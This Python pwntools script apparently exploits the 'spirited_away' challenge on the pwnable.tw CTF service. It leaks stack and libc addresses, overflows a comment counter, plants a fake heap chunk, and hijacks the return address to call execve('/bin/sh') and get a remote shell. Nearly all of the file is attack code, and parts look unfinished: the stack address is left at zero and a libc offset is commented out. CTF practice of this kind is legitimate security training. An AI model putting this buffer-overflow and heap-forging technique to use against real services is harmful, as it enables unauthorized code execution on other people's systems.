#coding=utf-8
from pwn import *
local = 0
exec_file="./spirited_away"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
            "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./spirited_away"]
if local :
    a=process(argv = argv)
    if context.arch == "i386" :
        #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10204)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+ "/spirited_away"]
    for key in a.libs():
        if "libc-2.23.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script +='''
    b *0x080486F8
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def comment_(name,age,reason,comment):
    a.sendlineafter("Please enter your name: ",name)
    a.sendlineafter("Please enter your age: ",str(age))
    a.sendafter("Why did you came to see this movie? ",reason)
    a.sendafter("Please enter your comment: ",comment)
    return 

def add(name,age,reason,comment):
    comment_(name,age,reason,comment)
    a.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
    return 

def add_2(age,reason):
    a.sendlineafter("Please enter your age: ",str(age))
    a.sendafter("Why did you came to see this movie? ",reason)
    a.sendafter("Would you like to leave another comment? <y/n>: ","y")
    return


def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE
#debug()

'''
comment_("jlx",20,"a" * 56,"b")
a.recvuntil("Reason: ")
a.recvuntil("a" * 56)
stack_addr = u32(a.recv(4)) - 0x70 + 8 +8
fuck(stack_addr)
a.recv(4)
libc_base = u32(a.recv(4)) - libc.sym["fflush"] - 11
fuck(libc_base)
a.sendafter("Would you like to leave another comment? <y/n>: ","y")
'''
#debug()
comment_("jlx",20,"a" * 20,"b")
a.recvuntil("Reason: ")
a.recvuntil("a" * 20)
stack_addr = 0
libc_base = u32(a.recv(4))# - libc.sym["puts"]  - 347
fuck(libc_base)

for i in range(9):
    add("jlx",20 + i,"aaaa","bbbb")
for i in range(90):
    add_2(30+i,"cccc")
fake_chunk = "/bin/sh\x00"+ p32(0) + p32(0x41) + p32(0)*14 + p32(0) + p32(0x21)
payload = '\x00' * 80 + p32(21) + p32(stack_addr)
#debug()
comment_("jlx",20,fake_chunk,payload)
a.sendafter("Would you like to leave another comment? <y/n>: ","y")
payload = 64 * 'a' + p32(0) + p32(libc_base + libc.sym["execve"]) + p32(0) + p32(stack_addr - 16) +p32(0) + p32(0)
comment_(payload,20,"/bin/sh\x00",'aaa')
a.sendafter("Would you like to leave another comment? <y/n>: ","n")
a.interactive()
